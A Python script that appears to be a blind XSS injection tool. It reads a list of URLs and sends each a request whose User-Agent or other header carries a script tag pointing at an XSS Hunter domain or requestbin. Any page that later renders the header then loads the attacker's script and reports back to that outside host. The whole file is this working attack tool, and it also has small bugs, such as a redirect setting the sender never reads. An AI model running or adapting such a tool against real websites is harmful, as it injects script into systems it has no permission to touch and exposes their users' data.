import requests , optparse , concurrent.futures , urllib3

from os import path
from utils.showOutput import logOutput
from utils.showOutput import errorOutput

def PayloadsStripper(Payload , Strip):
    if Strip == None or Strip == '':
        Strip = ","

    if Strip in Payload:
        # There's something to split
        Payloads = Payload.split(Strip)
    else:
        Payloads = Payload

    return Payloads

def Validation(Options):
    # Main Config For `Main`
    Config = {
        "file":"",
        "xsshunter":"",
        "bin":"",
        "mode":"",
        "payload":"",
        "redirection":"",
        "header":"",
        "replace":""
    }

    # File Validation
    if Options.file != None:
        if path.exists(Options.file):
            Config["file"] = Options.file
        else:
            errorOutput("File not found", "The file you used doesn't exist")
            exit()
    else:
        errorOutput("Missing argumnets", "You didn't use a file to be used in blinder")
        exit()

    # XSSHunter And Bin Validation 
    if Options.username != None:
        if Options.bin != None:
            errorOutput("Arguments error", "You're using both XSShunter and requestbin, you can only use one of them")
            exit()
        else:
            XSSHunter = "{0}.xss.ht".format(Options.username)
            Config["xsshunter"] = XSSHunter
    else:
        if Options.bin == None:
            errorOutput("Missing arguments", "You didn't use either XSShunter username or custom requestsbin")
            exit()
        else:
            Config["bin"] = Options.bin

    # Replace Validation Before Payload.
    if Options.replace != None:
        Config["replace"] = Options.replace
    else:
        Config["replace"] = "XXX" 

    # Payload Validation
    if Options.payload != None:
        # The User Selected a Payload
        if Config["replace"] not in Options.payload:
            errorOutput("Missing replace string", "Your payload doesn't contain the replace string `XSS`")
            exit()
        else:
            Config["payload"] = Options.payload
    else:
        Config["payload"] = f'"><script src={Config["replace"]}></script>'

    # Redirection Validation
    if Options.redirect != None:
        if Options.redirect.lower() == "allow" or Options.redirect.lower() == "deny":
            pass
        else:
            errorOutput("Unknown redirection mode", "You used an unknown redirection mode")
            exit()
    else:
        Config["redirect"] = "allow"

    if Options.header != None:
        Config["header"] = Options.header
    else:
        Config["header"] = "User-Agent"

    return Config

def Sender(URL , Redirect , payload , Hunter , Header , Replace):
    payload = payload.replace(Replace , Hunter)

    try:
        if Redirect == "allow":
            http_response = requests.get(URL , verify=False , timeout=5 , headers={Header:payload} , allow_redirects=True)
            logOutput(url=URL, code=http_response.status_code, payload=payload)
        else:
            http_response = requests.get(URL , verify=False , timeout=5 , headers={Header:payload} , allow_redirects=False)
            logOutput(url=URL, code=http_response.status_code, payload=payload)
    except Exception as e:
        errorOutput("Can't request this URL", URL)

def CollectOptions():
    Parser = optparse.OptionParser()
    Parser.add_option("-f" , "--file" , dest="file" , help="Path to the file that contains URLs")
    Parser.add_option("-u" , "--username" , dest="username" , help="XSShunter username")
    Parser.add_option("-p" , "--payload" , dest="payload" , help="The custom payload you wanna use")
    Parser.add_option("-b" , "--bin" , dest="bin" , help="The custom requestbin you wanna use")
    Parser.add_option("-r" , "--redirections" , dest="redirect" , help="allow/deny redirection")
    Parser.add_option("-s" , "--strip" , dest="strip" , help="The custom payload stripper")
    Parser.add_option("--replace" , dest="replace" , help="The custom replace string")
    Parser.add_option("--header" , dest="header" , help="The custom header you wanna use")

    Options , _ = Parser.parse_args()
    return Options

def Main(Options):
    with concurrent.futures.ThreadPoolExecutor() as Validate:
        Config = Validate.submit(Validation , Options)
        Config = Config.result()

    if Config["bin"] == '':
        Hunter = "https://" + Config["xsshunter"] + "/"
    else:
        Hunter = Config["bin"]

    Payloads = PayloadsStripper(Config["payload"] , Options.strip)

    if type(Payloads) == list:
        # There's more than one
        _mode = 0
    else:
        _mode = 1

    URLs = open(Config["file"] , 'r')
    for URL in URLs:
        URL = URL.rstrip("\n")

        if _mode == 1:
            Sender(URL=URL , Redirect=Config["redirection"] , payload=Config["payload"] , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
        elif _mode == 0:
            for SinglePayload in Payloads:
                Sender(URL=URL , Redirect=Config["redirection"] , payload=SinglePayload , Hunter=Hunter , Header=Config["header"] , Replace=Config["replace"])
        else:
            pass

if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    with concurrent.futures.ThreadPoolExecutor() as OptionsCollector:
        Options = OptionsCollector.submit(CollectOptions)
        Options = Options.result()

    with concurrent.futures.ThreadPoolExecutor() as Threader:
        _ = Threader.submit(Main , Options)
